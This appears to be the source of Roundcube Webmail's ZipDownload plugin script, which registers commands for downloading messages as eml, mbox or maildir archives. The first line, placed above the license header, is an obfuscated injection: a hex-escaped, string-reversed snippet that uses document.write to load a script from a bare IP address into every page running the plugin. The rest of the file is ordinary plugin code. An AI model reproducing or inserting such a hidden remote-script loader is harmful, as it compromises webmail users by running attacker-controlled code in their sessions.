var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * ZipDownload plugin script
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2013-2014, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */

window.rcmail && rcmail.addEventListener('init', function(evt) {
    // register additional actions
    rcmail.register_command('download-eml', function() { rcmail_zipdownload('eml'); });
    rcmail.register_command('download-mbox', function() { rcmail_zipdownload('mbox'); });
    rcmail.register_command('download-maildir', function() { rcmail_zipdownload('maildir'); });

    // commands status
    rcmail.message_list && rcmail.message_list.addEventListener('select', function(list) {
        var selected = list.get_selection().length;

        rcmail.enable_command('download', selected > 0);
        rcmail.enable_command('download-eml', selected == 1);
        rcmail.enable_command('download-mbox', 'download-maildir', selected > 1);
    });

    // hook before default download action
    rcmail.addEventListener('beforedownload', rcmail_zipdownload_menu);

    // find and modify default download link/button
    $.each(rcmail.buttons['download'] || [], function() {
        var link = $('#' + this.id),
            span = $('span', link);

        if (!span.length) {
            span = $('<span>');
            link.html('').append(span);
        }

        span.text(rcmail.get_label('zipdownload.download'));
        rcmail.env.download_link = link;
    });
});


function rcmail_zipdownload(mode)
{
    // default .eml download of single message
    if (mode == 'eml') {
        var uid = rcmail.get_single_uid();
        rcmail.goto_url('viewsource', rcmail.params_from_uid(uid, {_save: 1}), false, true);
        return;
    }

    // multi-message download, use hidden form to POST selection
    if (rcmail.message_list && rcmail.message_list.get_selection().length > 1) {
        var inputs = [], form = $('#zipdownload-form'),
            post = rcmail.selection_post_data();

        post._mode = mode;
        post._token = rcmail.env.request_token;

        $.each(post, function(k, v) {
            if (typeof v == 'object' && v.length > 1) {
              for (var j=0; j < v.length; j++)
                  inputs.push($('<input>').attr({type: 'hidden', name: k+'[]', value: v[j]}));
            }
            else {
                inputs.push($('<input>').attr({type: 'hidden', name: k, value: v}));
            }
        });

        if (!form.length)
            form = $('<form>').attr({
                    style: 'display: none',
                    method: 'POST',
                    action: '?_task=mail&_action=plugin.zipdownload.messages'
                })
                .appendTo('body');

        form.html('').append(inputs).submit();
    }
}

// display download options menu
function rcmail_zipdownload_menu(e)
{
    // show (sub)menu for download selection
    rcmail.command('menu-open', 'zipdownload-menu', e && e.target ? e.target : rcmail.env.download_link, e);

    // abort default download action
    return false;
}
